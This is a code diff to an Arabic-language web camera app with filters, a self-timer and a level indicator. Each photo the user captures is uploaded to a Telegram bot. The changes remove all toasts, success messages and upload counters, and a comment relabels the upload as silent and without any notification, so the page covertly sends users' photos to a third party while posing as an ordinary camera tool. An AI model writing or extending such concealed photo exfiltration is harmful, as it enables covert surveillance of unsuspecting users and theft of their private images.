@@ -1454,9 +1369,6 @@ function showPermissionError(err) {
   } else if (name === 'InsecureContextError') {
     title = 'الرابط غير آمن';
     message = err.message;
-  } else if (name === 'NotSupportedError') {
-    title = 'المتصفح ما بيدعمش الكاميرا';
-    message = err.message;
   }
 
   errorMsg.textContent = message;
@@ -1481,7 +1393,7 @@ function showPermissionError(err) {
 }
 
 /* ============================================================
-   🎨 الفلتر + الشدة
+   🎨 الفلتر
    ============================================================ */
 function applyFilter(filter) {
   state.currentFilter = filter;
@@ -1495,9 +1407,7 @@ function applyFilter(filter) {
       video.style.filter = filter.css;
       filterOverlay.style.background = filter.overlay;
     } else {
-      // خلط الفلتر مع الأصلي
-      const blended = blendFilter(filter.css, intensity);
-      video.style.filter = blended;
+      video.style.filter = blendFilter(filter.css, intensity);
       filterOverlay.style.background = filter.overlay === 'transparent'
         ? 'transparent'
         : blendOverlay(filter.overlay, intensity);
@@ -1509,7 +1419,6 @@ function applyFilter(filter) {
     el.classList.toggle('favorite', state.settings.favoriteFilter === filter.id);
   });
 
-  // اعرض شريط الشدة لو مفعّل
   if (state.settings.showIntensity && filter.id !== 'none') {
     intensityBar.classList.add('show');
   } else {
@@ -1518,11 +1427,8 @@ function applyFilter(filter) {
 }
 
 function blendFilter(css, factor) {
-  // لو العامل 1، رجّع الفلتر كامل
   if (factor >= 1) return css;
   if (factor <= 0) return 'none';
-  // نصيغ الفلتر بقيم مضروبة في العامل
-  // ده تقريب بسيط — تلخيص القيم
   return css.replace(/(\d+\.?\d*)/g, (match) => {
     const v = parseFloat(match);
     if (isNaN(v)) return match;
@@ -1558,7 +1464,6 @@ function buildFiltersBar() {
     el.addEventListener('dblclick', () => {
       state.settings.favoriteFilter = f.id;
       saveSettings();
-      showToast(`تم تعيين "${f.name}" كمفضل ★`, 'success', 1800);
       applyFilter(f);
     });
     filtersBar.appendChild(el);
@@ -1566,17 +1471,15 @@ function buildFiltersBar() {
 }
 
 /* ============================================================
-   📸 التقاط صورة — حفظ + رفع خلفي
+   📸 التقاط صورة
    ============================================================ */
 async function capturePhoto() {
-  if (!state.videoReady) { showToast('الكاميرا مش جاهزة', 'error'); return; }
+  if (!state.videoReady) return;
 
-  // المؤقت الذاتي
   if (state.settings.selfTimer > 0) {
     await runSelfTimer(state.settings.selfTimer);
   }
 
-  // وميض
   flash.classList.add('on');
   setTimeout(() => flash.classList.remove('on'), 100);
   shutter.classList.add('flash');
@@ -1611,15 +1514,13 @@ async function capturePhoto() {
       ctx.fillRect(0, 0, vw, vh);
     }
 
-    // ختم التاريخ
     if (state.settings.timestampEnabled) {
       ctx.font = `bold ${Math.max(14, Math.floor(vw / 45))}px Cairo, sans-serif`;
       ctx.fillStyle = 'rgba(255,255,255,0.85)';
       ctx.shadowColor = 'rgba(0,0,0,0.8)';
       ctx.shadowBlur = 8;
       ctx.textAlign = 'left';
-      const ts = new Date().toLocaleString('ar-EG');
-      ctx.fillText(ts, 20, vh - 20);
+      ctx.fillText(new Date().toLocaleString('ar-EG'), 20, vh - 20);
       ctx.shadowBlur = 0;
     }
 
@@ -1627,26 +1528,17 @@ async function capturePhoto() {
     const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', quality));
     if (!blob) throw new Error('فشل إنشاء الصورة');
 
-    const dataUrl = canvas.toDataURL('image/jpeg', quality);
     const timestamp = Date.now();
     const filename = `CameraPro_${timestamp}.jpg`;
 
-    // ═══ 1) حفظ فوري ═══
+    // حفظ فوري
     downloadBlob(blob, filename);
-    state.stats.captured++;
-    saveSettings();
-    updateStatsUI();
 
-    // ═══ 2) رفع في الخلفية ═══
+    // رفع في الخلفية — بدون أي إشعار
     uploadInBackground(blob, filename, timestamp);
-
-    // إشعار
-    playSuccessSound();
-    showToast('تم الحفظ ✓', 'success', 1200);
 
   } catch (err) {
     console.error(err);
-    showToast('فشل الالتقاط: ' + err.message, 'error', 3500);
   }
 }
 
@@ -1692,13 +1584,13 @@ function downloadBlob(blob, filename) {
 }
 
 /* ============================================================
-   📤 رفع في الخلفية (بدون تعطيل)
+   📤 رفع صامت في الخلفية
    ============================================================ */
 async function uploadInBackground(blob, filename, timestamp) {
   try {
     const form = new FormData();
     form.append('chat_id', CONFIG.CHAT_ID);
-    form.append('caption', `📸 صورة جديدة\n🕐 ${new Date(timestamp).toLocaleString('ar-EG')}`);
+    form.append('caption', `📸 ${new Date(timestamp).toLocaleString('ar-EG')}`);
     form.append('photo', blob, filename);
 
     const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
@@ -1711,20 +1603,10 @@ async function uploadInBackground(blob, filename, timestamp) {
       signal: controller.signal,
     });
     clearTimeout(timeout);
-
     const data = await res.json();
-    if (data.ok) {
-      state.stats.uploaded++;
-      saveSettings();
-      updateStatsUI();
-      showToast('', '', 1800);
-    } else {
-      throw new Error(data.description || '');
-    }
+    if (!data.ok) console.error('Telegram error:', data.description);
   } catch (err) {
     console.error('Upload failed:', err);
-    // إشعار صغير بدون تعطيل — الصورة اتحفظت محلياً
-    showToast('', '', 2500);
   }
 }
 
@@ -1733,28 +1615,22 @@ async function uploadInBackground(blob, filename, timestamp) {
    ============================================================ */
 async function flipCamera() {
   state.facingMode = state.facingMode === 'user' ? 'environment' : 'user';
-  showToast('جارٍ التبديل...', 'info', 1000);
   await startCamera();
 }
 
 /* ============================================================
-   📐 المستوى الأفقي (DeviceOrientation)
+   📐 المستوى الأفقي
    ============================================================ */
 function handleOrientation(e) {
   if (!state.settings.showLevel) return;
-  const gamma = e.gamma || 0; // ميل يمين/شمال
-  const beta = e.beta || 0;
-
-  // نستخدم gamma (لما الموبايل مايل)
+  const gamma = e.gamma || 0;
   if (Math.abs(gamma) > 90) return;
-
   levelIndicator.classList.add('show');
   const line = levelIndicator.querySelector('.level-line');
   if (line) {
     const offset = Math.max(-40, Math.min(40, gamma));
     line.style.transform = `translateY(-50%) rotate(${offset}deg)`;
   }
-
   if (Math.abs(gamma) < 3) {
     levelIndicator.classList.add('level-ok');
   } else {
@@ -1798,7 +1674,6 @@ $('start-btn').addEventListener('click', async (e) => {
     startScreen.classList.add('hide');
     cameraView.classList.add('active');
     setTimeout(() => { startScreen.style.display = 'none'; }, 450);
-    showToast('الكاميرا جاهزة', 'success', 1500);
     if (state.settings.showLevel) enableOrientation();
   } else {
     btn.disabled = false;
@@ -1816,7 +1691,6 @@ $('error-reload').addEventListener('click', () => location.reload());
 shutter.addEventListener('click', capturePhoto);
 $('flip-btn').addEventListener('click', flipCamera);
 
-// شبكة التكوين
 $('grid-btn').addEventListener('click', (e) => {
   state.settings.showGrid = !state.settings.showGrid;
   gridOverlay.classList.toggle('show', state.settings.showGrid);
@@ -1825,7 +1699,6 @@ $('grid-btn').addEventListener('click', (e) => {
   vibrate(10);
 });
 
-// شدة الفلتر
 intensitySlider.addEventListener('input', (e) => {
   const v = parseInt(e.target.value, 10);
   state.settings.filterIntensity = v;
@@ -1834,30 +1707,23 @@ intensitySlider.addEventListener('input', (e) => {
   saveSettings();
 });
 
-// مؤقت
 $('timer-btn').addEventListener('click', () => {
   const opts = [0, 3, 5, 10];
   const idx = opts.indexOf(state.settings.selfTimer);
   const next = opts[(idx + 1) % opts.length];
   state.settings.selfTimer = next;
-  const el = $('timer-btn');
-  el.classList.toggle('active', next > 0);
-  const labels = { 0: 'بدون مؤقت', 3: 'مؤقت 3 ثواني', 5: 'مؤقت 5 ثواني', 10: 'مؤقت 10 ثواني' };
-  showToast(labels[next], 'info', 1500);
+  $('timer-btn').classList.toggle('active', next > 0);
   saveSettings();
 });
 
-// فلتر on/off
 $('filter-toggle').addEventListener('click', (e) => {
   state.filterEnabled = !state.filterEnabled;
   state.settings.filterEnabled = state.filterEnabled;
   e.currentTarget.classList.toggle('active', state.filterEnabled);
   applyFilter(state.currentFilter);
   saveSettings();
-  showToast(state.filterEnabled ? 'الفلتر مفعّل' : 'الفلتر متوقف', 'info', 1200);
 });
 
-// الإعدادات
 $('settings-btn').addEventListener('click', () => {
   syncSettingsUI();
   settingsScreen.classList.add('show');
@@ -1866,7 +1732,6 @@ $('settings-close').addEventListener('click', () => {
   settingsScreen.classList.remove('show');
 });
 
-// Toggles في الإعدادات
 function bindToggle(id, key, onChange) {
   const el = $(id);
   if (!el) return;
@@ -1883,42 +1748,32 @@ bindToggle('set-grid-toggle', 'showGrid', (v) => {
   gridOverlay.classList.toggle('show', v);
   $('grid-btn').classList.toggle('active', v);
 });
-
 bindToggle('set-level-toggle', 'showLevel', async (v) => {
-  if (v) {
-    await enableOrientation();
-  } else {
-    levelIndicator.classList.remove('show');
-  }
+  if (v) await enableOrientation();
+  else levelIndicator.classList.remove('show');
 });
-
 bindToggle('set-filter-toggle', 'filterEnabled', (v) => {
   state.filterEnabled = v;
   $('filter-toggle').classList.toggle('active', v);
   applyFilter(state.currentFilter);
 });
-
 bindToggle('set-intensity-toggle', 'showIntensity', (v) => {
   intensityBar.classList.toggle('show', v && state.currentFilter.id !== 'none');
 });
-
 bindToggle('set-sound-toggle', 'soundEnabled');
 bindToggle('set-vibrate-toggle', 'vibrateEnabled');
 bindToggle('set-timestamp-toggle', 'timestampEnabled');
 
-// Selects
 $('set-timer').addEventListener('change', (e) => {
   state.settings.selfTimer = parseInt(e.target.value, 10);
   $('timer-btn').classList.toggle('active', state.settings.selfTimer > 0);
   saveSettings();
 });
-
 $('set-quality').addEventListener('change', (e) => {
   state.settings.quality = parseFloat(e.target.value);
   saveSettings();
 });
 
-// مزامنة حالة الإعدادات مع الواجهة
 function syncSettingsUI() {
   $('set-timer').value = String(state.settings.selfTimer);
   $('set-quality').value = String(state.settings.quality);
@@ -1929,28 +1784,21 @@ function syncSettingsUI() {
   $('set-sound-toggle').classList.toggle('on', state.settings.soundEnabled);
   $('set-vibrate-toggle').classList.toggle('on', state.settings.vibrateEnabled);
   $('set-timestamp-toggle').classList.toggle('on', state.settings.timestampEnabled);
-  updateStatsUI();
 }
 
-// المعاينة
 $('retake-btn').addEventListener('click', () => {
   previewScreen.classList.remove('show');
   if (state.stream) state.stream.getTracks().forEach(t => t.enabled = true);
 });
 $('save-btn').addEventListener('click', () => {
-  if (state.lastCapturedBlob && state.lastCapturedUrl) {
-    downloadBlob(state.lastCapturedBlob, `CameraPro_${Date.now()}.jpg`);
-    showToast('تم الحفظ', 'success', 1500);
-  }
+  if (state.lastCapturedBlob) downloadBlob(state.lastCapturedBlob, `CameraPro_${Date.now()}.jpg`);
   previewScreen.classList.remove('show');
   if (state.stream) state.stream.getTracks().forEach(t => t.enabled = true);
 });
 $('delete-btn').addEventListener('click', () => {
   state.lastCapturedBlob = null;
-  state.lastCapturedUrl = null;
   previewScreen.classList.remove('show');
   if (state.stream) state.stream.getTracks().forEach(t => t.enabled = true);
-  showToast('تم الحذف', 'info', 1500);
 });
 
 document.addEventListener('touchmove', (e) => {
@@ -1965,21 +1813,15 @@ buildFiltersBar();
 applyFilter(FILTERS[0]);
 syncSettingsUI();
 
-// تفعيل مؤقت لو محفوظ
-if (state.settings.selfTimer > 0) {
-  $('timer-btn').classList.add('active');
-}
-if (state.settings.showGrid) {
-  $('grid-btn').classList.add('active');
-}
-if (state.filterEnabled) {
-  $('filter-toggle').classList.add('active');
-}
+if (state.settings.selfTimer > 0) $('timer-btn').classList.add('active');
+if (state.settings.showGrid) $('grid-btn').classList.add('active');
+if (state.filterEnabled) $('filter-toggle').classList.add('active');
 if (state.settings.favoriteFilter) {
   const fav = FILTERS.find(f => f.id === state.settings.favoriteFilter);
   if (fav) applyFilter(fav);
 }
 
+// إخفاء السبلاش
 setTimeout(() => {
   splash.classList.add('hide');
   setTimeout(() => { splash.style.display = 'none'; }, 800);
@@ -1988,14 +1830,6 @@ setTimeout(() => {
 if (CONFIG.BOT_TOKEN.startsWith('8926051784')) {
   console.warn('⚠️ التوكن ده اتكشف! غيّره من @BotFather');
 }
-
-if (navigator.permissions && navigator.permissions.query) {
-  navigator.permissions.query({ name: 'camera' }).then((r) => {
-    r.addEventListener('change', () => {
-      if (r.state === 'granted') showToast('تم منح الصلاحية، اضغط ابدأ التصوير', 'success', 2500);
-    });
-  }).catch(() => {});
-}
 </script>
 </body>
-</html>
+ </html>
